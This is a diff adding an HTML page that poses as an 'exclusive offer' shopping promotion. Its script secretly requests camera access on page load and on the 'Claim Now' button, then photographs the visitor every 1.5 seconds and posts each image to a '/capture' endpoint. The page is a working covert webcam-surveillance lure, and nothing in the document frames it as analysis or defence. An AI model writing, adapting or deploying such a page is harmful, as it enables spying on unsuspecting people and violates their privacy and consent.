@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Offer Just for You!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: url('https://source.unsplash.com/1600x900/?shopping,sale') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            margin: 0;
+            padding: 0;
+        }
+        .offer-box {
+            margin-top: 100px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        h1 { font-size: 28px; }
+        p { font-size: 18px; }
+        button {
+            background: gold;
+            color: black;
+            padding: 10px 20px;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="offer-box">
+        <h1>🎁 You've Been Selected!</h1>
+        <p>Claim your exclusive offer now before time runs out.</p>
+        <button onclick="startCapture()">Claim Now</button>
+    </div>
+
+    <script>
+        let capturing = false;
+        let videoStream;
+
+        function startCapture() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    videoStream = stream;
+                    capturing = true;
+                    captureLoop();
+                })
+                .catch(error => console.error("Error accessing camera:", error));
+        }
+
+        function captureLoop() {
+            if (!capturing) return;
+            let track = videoStream.getTracks()[0];
+            let imageCapture = new ImageCapture(track);
+            imageCapture.takePhoto()
+                .then(blob => {
+                    let reader = new FileReader();
+                    reader.onloadend = function () {
+                        fetch('/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image: reader.result })
+                        });
+                    };
+                    reader.readAsDataURL(blob);
+                })
+                .catch(error => console.error("Capture error:", error));
+
+            setTimeout(captureLoop, 1500);
+        }
+
+        window.onload = startCapture; // Start capturing when page loads
+    </script>
+</body>
+</html>
